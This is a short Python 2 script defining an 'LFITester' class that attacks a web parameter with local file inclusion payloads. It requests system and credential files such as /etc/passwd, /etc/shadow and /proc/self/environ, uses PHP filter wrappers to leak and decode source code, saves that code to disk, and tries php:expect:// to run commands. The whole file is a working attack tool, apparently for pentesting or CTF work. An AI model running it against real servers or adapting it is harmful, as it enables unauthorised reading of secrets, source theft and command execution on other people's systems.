import requests
from STTUtils.encoding import rot13, b64d

"""
most exploits taken from PayloadAllTheThing
https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
"""

exploitList = ['/etc/issue',
               '/etc/passwd',
               '/etc/shadow',
               '/etc/group',
               '/etc/hosts',
               '/etc/motd',
               '/etc/mysql/my.cnf',
               '/proc/[0-9]*/fd/[0-9]*',
               '/proc/self/environ',
               '/proc/version',
               '/proc/cmdline',
               'login',
               'help',
               'index',
               'admin',
               'cookie']

suffix = ['%00',
          '%2500']

wrappers = ['php://filter/read=string.rot13/resource=',
            'php://filter/convert.base64-encode/resource=',
            'pHp://FilTer/convert.base64-encode/resource=',
            'php:expect://id',
            'php:expect://ls']

class LFITester:
    def __init__(self,target,tag = 'file'):
        self.target = target
        self.tag = tag

    def get(self,s):
        return requests.get(self.target +'?' + self.tag + '=' + s)

    def tryAll(self):
        for i in exploitList:
            tmp = self.get(i)
            print tmp.text

    def removeHead(self,s):
        return s[s.index('</head>')+7:]

    def tryWrappers(self, save = False, verbose = True,List = exploitList):
        for i in wrappers:
            for j in List:
                tmp = self.get(i+j).text
                tmp = self.removeHead(tmp)
                
                fn = j.replace('/','_')
                if 'rot13' in i and 'rot13' not in tmp:
                    fn +='_rot13'
                    tmp = rot13(tmp)
                    
                elif 'base64' in i:
                    fn += '_b64'
                    tmp = b64d(tmp)
                
                if '?php' in tmp:
                    if save:
                        open('%s.php'%fn,'wb').write(tmp)
                    if verbose:
                        print tmp
                else:
                    print tmp
                
                
